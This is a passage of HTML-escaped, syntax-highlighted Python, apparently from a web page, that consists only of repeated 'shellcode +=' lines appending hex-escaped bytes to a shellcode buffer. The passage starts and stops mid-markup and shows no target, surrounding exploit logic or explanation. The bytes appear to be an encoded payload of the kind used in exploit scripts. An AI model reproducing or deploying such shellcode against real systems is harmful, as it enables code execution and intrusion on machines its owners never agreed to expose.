z-escape z-hex z-python&quot;&gt;\x49&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc7&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x11&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x09&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xec&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb5&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x75&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc9&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xec&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd3&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xbc&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb2&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xee&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xbb&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x61&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x17&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x65&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x51&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x75&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x24&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3e&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xba&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x07&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd6&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xbe&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd4&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x10&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa5&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x7b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x21&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xbd&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf4&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x15&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb6&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc2&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x28&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x12&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x61&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xfa&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x85&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x42&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x19&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa6&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x08&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd9&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd4&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x73&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x89&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x7a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x5f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x79&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x37&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x93&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb4&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc3&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x28&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x1e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x6c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc2&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x67&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc9&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x53&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xbb&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x66&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x39&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xbe&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x68&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x38&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x07&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x37&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x50&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x67&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x1e&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x19&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xcd&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x1e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x6c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xde&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x91&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xaf&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x54&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x16&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x61&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x61&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x53&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x71&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x16&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x6d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x72&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x84&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x43&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x5d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe0&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x43&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x93&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x28&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x19&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xdc&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc4&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x7d&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xef&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x15&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x80&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x93&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x56&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb6&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x69&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x0e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf7&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x72&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb6&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf3&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf6&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x7b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x4f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape 